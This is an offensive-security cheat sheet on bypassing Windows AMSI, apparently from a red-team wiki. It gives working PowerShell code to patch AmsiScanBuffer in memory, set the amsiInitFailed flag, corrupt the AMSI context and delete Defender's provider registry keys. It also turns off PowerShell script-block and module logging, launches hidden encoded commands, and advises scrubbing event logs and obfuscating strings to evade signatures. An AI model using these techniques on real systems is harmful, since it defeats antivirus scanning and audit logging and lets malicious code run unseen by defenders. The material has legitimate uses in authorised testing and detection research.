---
title: "AMSI Bypass"
---

# 🔓 AMSI Bypass

> _AMSI (Antimalware Scan Interface) is a runtime hook that lets the registered
> AV scan buffers before they're interpreted. Targets: PowerShell, VBScript,
> JScript, Office VBA, .NET assemblies loaded from memory, WMI. Bypass either
> the interface, its context, or the provider that answers it._

## 📚 Resources

- [Matt Graeber - COM Server Hijacking of AMSI](https://posts.specterops.io/)
- [amsi.fail](https://amsi.fail/) - randomized bypass generator
- [Rasta-mouse - AMSI bypass series](https://rastamouse.me/)
- [Microsoft - AMSI architecture](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [S3cur3Th1sSh1t - Amsi-Bypass-Powershell catalogue](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

## 🛠️ Tools

- [amsi.fail](https://amsi.fail/) - fresh obfuscated bypass each request
- [Invoke-AMSIBypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) - 10+ techniques
- [AMSITrigger](https://github.com/RythmStick/AMSITrigger) - find which part of _your_ script triggers AMSI
- [SharpBlock](https://github.com/CCob/SharpBlock) - EDR unhook including AMSI via debugger API
- [AMSIBypass2](https://github.com/RythmStick/AMSIBypass) - compact HWBP PoC

## 🧭 How AMSI works

```text
 Script host (PowerShell / WScript / .NET / Office VBA)
   │
   ▼
 amsi.dll  ◄── AmsiScanBuffer(ctx, buf, len, ...)
   │
   ▼
 Registered AMSI providers (COM)
   │   HKLM\SOFTWARE\Microsoft\AMSI\Providers\{CLSID}
   ▼
 Defender's MpOav.dll (or 3rd-party AV provider)
   │
   ▼
 AMSI_RESULT  ►  CLEAN (0) ... DETECTED (32768)
```

Three bypass surfaces:

1. **In-process patching** - modify `amsi.dll` in the calling process so `AmsiScanBuffer` returns clean.
2. **Context corruption** - mark the AMSI session as failed, scan gets skipped.
3. **Provider unregistration** - remove the COM link so nothing answers.

## 🩹 In-process patching

Each technique runs from PowerShell and only needs read/write on the caller's own memory - **no elevation** required.

::: code-group

```powershell [amsiInitFailed flag]
# The classic - flip the managed AmsiUtils flag; PowerShell skips the scan
$a = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils'))
$f = $a.GetField(('amsiInitFailed'),'NonPublic,Static')
$f.SetValue($null,$true)
```

```powershell [NOP patch]
# Overwrite AmsiScanBuffer's prologue with xor eax,eax ; ret
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W {
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h,string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
}
"@
$lib  = [W]::LoadLibrary("amsi.dll")
$addr = [W]::GetProcAddress($lib,"AmsiScanBuffer")
$patch = [byte[]](0x31,0xC0,0xC3)              # xor eax,eax ; ret
[uint32]$old = 0
[W]::VirtualProtect($addr,[UIntPtr]3,0x40,[ref]$old) | Out-Null
[Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,3)
```

```powershell [Hardware breakpoint]
# No code patch, no memory write - set a HW bp on AmsiScanBuffer, SEH returns 0
# Full PoC: https://github.com/rbmm/AMSI_patch
# Invisible to AMSI telemetry (no amsi.dll modification), but version-fragile
```

:::

> [!warning]
> The literal strings `amsiInitFailed`, `System.Management.Automation.AmsiUtils`
> and `AmsiScanBuffer` are themselves AMSI signatures. Always wrap them in
> an obfuscation primitive from [signatures#-string-obfuscation](./signatures.md#-string-obfuscation) -
> `('amsi','Init','Failed' -join '')` or char-code builds.

## 🧩 Context corruption

Instead of patching code, corrupt the data `AmsiScanBuffer` depends on. Faster, less to flag, no code patch.

```powershell
# Zero the HAMSICONTEXT so AmsiScanBuffer returns E_INVALIDARG and PS falls through
$u = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils'))
$c = $u.GetField(('amsiContext'),'NonPublic,Static')
[IntPtr]$h = $c.GetValue($null)
# Overwrite the magic ("AMSI") at offset 0x8 - breaks signature check
[Runtime.InteropServices.Marshal]::Copy([byte[]](0,0,0,0),0,
    [IntPtr]($h.ToInt64()+0x8),4)
```

Pros: no code patch in `amsi.dll`, no AmsiHook event. Cons: offsets are version-dependent on PowerShell internals.

## 🚫 Provider unregistration

Removes the AMSI ↔ Defender link entirely. Needs **admin**.

```powershell
# Defender's AMSI provider CLSID
$clsid = '{2781761E-28E0-4109-99FE-B9D127C57AFE}'   # Defender MpOav

Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\$clsid" -Recurse -Force
Remove-Item "HKLM:\SOFTWARE\Classes\CLSID\$clsid"            -Recurse -Force

# Or in-process COM hijack (no registry write):
# Register a bogus CLSID in HKCU - COM resolves HKCU before HKLM
```

> [!success]
> Confirm the bypass worked:
>
> ```powershell
> 'AmsiUtils' | Select-String amsi
> ```
>
> Without bypass: `"This script contains malicious content and has been blocked by your antivirus software."`
> With bypass: the string echoes back clean. No popup, no `AMSI_RESULT_DETECTED`.

## 🧬 Loader-side pre-AMSI

Skip the interface entirely by loading the interpreter without AMSI:

- **PS2 downgrade** - `powershell -version 2` - no AMSI on PS2. Removed from Server 2019+ / Win11 by default.
- **DLL hijack `amsi.dll`** - drop a stub `amsi.dll` next to your PE (DLL search order). PowerShell loads your stub, `AmsiScanBuffer` returns 0.
- **Custom runspace** - host CLR / PowerShell runspace from a C# loader with AMSI patched before the first scan.
- **Unmanaged PowerShell** - [NoPowerShell](https://github.com/bitsadmin/nopowershell) runs PS cmdlets without `powershell.exe`, dodging the whole AMSI integration.

## 🗣️ PowerShell logging adjacent

AMSI is only part of the PowerShell visibility stack. Pair the bypass with:

```powershell
# Script Block Logging (Event ID 4104) + Module Logging (4103) bypass
# Flip the cached group policy values in the current runspace
$g = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$g['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$g['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']['EnableModuleLogging']           = 0

# Common launcher flags (not AV, just noise reduction)
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <b64>
```

## 🛡️ OPSEC

- **PowerShell events** to scrub or stay under: 4103 (module), 4104 (scriptblock), 4105/4106 (start/stop). Scrub or disable _before_ firing the bypass.
- **AMSI telemetry** - Defender logs ETW `Microsoft-Antimalware-Scan-Interface`. In-process patching is invisible to it; context corruption and provider removal are visible.
- **Public bypasses are signatured**. The 2016 Graeber one-liner hits 100% today. Always run your bypass through [signatures#-signature-identification](./signatures.md#-signature-identification) first.
- **PS7 / pwsh** - the AMSI integration moved in .NET 5+. Many PS5.1 bypasses need rework for PS7. Check with `$PSVersionTable`.
